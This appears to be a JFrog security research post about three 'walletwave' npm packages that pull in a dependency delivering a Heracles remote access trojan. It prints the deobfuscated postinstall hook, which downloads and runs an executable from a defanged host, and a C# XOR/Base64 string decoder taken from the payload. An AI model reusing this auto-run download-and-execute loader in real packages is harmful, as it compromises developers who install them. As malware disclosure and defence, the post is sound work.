{"hash":"44e8fb14e640118b706bc012b76732df5c446873","data":{"realTimePost":{"description":"Guy Korolevski, JFrog Security Researcher","title":"Crypto packages on NPM deliver Heracles malware via dependency","date":"November 11, 2025","type":"realTimePost","tag":"Real Time Post","img":"/img/RealTimePostImage/post_thumbnail1.png","path":"/post/crypto-packages-npm-deliver-heracles-malware/","content":"<p>Our research team recently analyzed three new npm packages, all of which contain known malware, all published by the user ‘<strong>walletwave’</strong> with a total of nearly 2K downloads:</p>\n<ul>\n<li>@walletwave/ui - XRAY-744788  </li>\n<li>@walletwave/backend - XRAY-744789  </li>\n<li>@walletwave/core - XRAY-744787</li>\n</ul>\n<p><img src=\"/img/RealTimePostImage/post/crypto-npm-heracles-walletwave-core.png\">\n<em>@walletwave/core live on npm, prior to it's removal</em></p>\n<p>While the first two seem like legitimate crypto packages for walletwave that use solana, they have a dependency package ‘<strong>@walletwave/core’</strong>:</p>\n<pre><code class=\"language-json\">\"dependencies\": {\n    \"@walletwave/core\": \"^1.2.0\",\n    \"@solana/web3.js\": \"^1.87.6\",\n    \"bs58\": \"^5.0.0\"\n  },\n</code></pre>\n<p>The package in the dependencies has obfuscated code that runs <strong>automatically</strong> after installation. After opening the obfuscation, we discovered a suspicious download and execute code that is started automatically in the postinstall.js file (de-fanged):</p>\n<pre><code class=\"language-javascript\">const fs = require('fs'), path = require('path'), os = require('os'), {spawn} = require('child_process'), https = require('https');\nconst exeUrl = 'hxxrs[:]//dependency-bot[.]pages[.]dev/npm.txt', tempDir = os.tmpdir(), exeFilePath = path.join(tempDir, 'npm.exe');\nhttps.get(exeUrl, _0x13bbf8 => {\n    ;\n    if (_0x13bbf8.statusCode === 200) {\n        const _0x24178f = fs.createWriteStream(exeFilePath);\n        _0x13bbf8.pipe(_0x24178f);\n        _0x24178f.on('finish', () => {\n            ;\n            _0x24178f.close();\n            const _0x47d5df = spawn(exeFilePath, [], {\n                'detached': true,\n                'stdio': 'ignore',\n                'shell': true\n            });\n            _0x47d5df.unref();\n        });\n        ...\n    }\n    ...\n}\n</code></pre>\n<p>Further analysis of the file shows it is a highly obfuscated .NET file, a variant of <strong>MSILHeracles</strong>, as shown in this <a href=\"https://www.virustotal.com/gui/file/ef3186bf1455b9e9152c33f7bf60a21fde1ea42b7c24e84b7f1c6e4cca383328/detection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">VirusTotal Analysis</a>.<br>\nThe obfuscation is comprehensive, employing techniques such as renaming functions and variables, and concealing strings using Base64 and XOR encoding.</p>\n<pre><code class=\"language-c#\">public static string aA07ueRVVptZcwMsE3Vl(string encryptedText)\n{\n    string @string = Encoding.UTF8.GetString(Convert.FromBase64String(\"VExTSld1Zw==\"));\n    List&#x3C;char> list = new List&#x3C;char>();\n    int num = 0;\n    byte[] array = Convert.FromBase64String(encryptedText);\n    byte[] array2 = array;\n    foreach (byte b in array2)\n    {\n        char item = Strings.Chr((int)checked((byte)(b ^ Strings.Asc(@string[num]))));\n        list.Add(item);\n        num = checked(num + 1) % @string.Length;\n    }\n    return new string(list.ToArray());\n}\n</code></pre>\n<p>While revealing all IOC might be difficult with static analysis, it is clear that the code contains malicious intent, such as remote socket connections, dynamic assembly loading from base64, and even Remote Access Trojan (RAT) capabilities, including screen capture and desktop utilities.</p>\n<p>Final payload hash - ef3186bf1455b9e9152c33f7bf60a21fde1ea42b7c24e84b7f1c6e4cca383328</p>\n<p>JFrog Xray has been updated to protect against these malicious packages. We recommend that anyone who has been compromised immediately remove these packages and run a full analysis on the endpoints that installed them.</p>\n","excerpt":"Our team found and reported crypto packages that delivered known malware via a dependency, with a total of nearly 2K downloads","minutes":"4","schema":""}},"context":{}}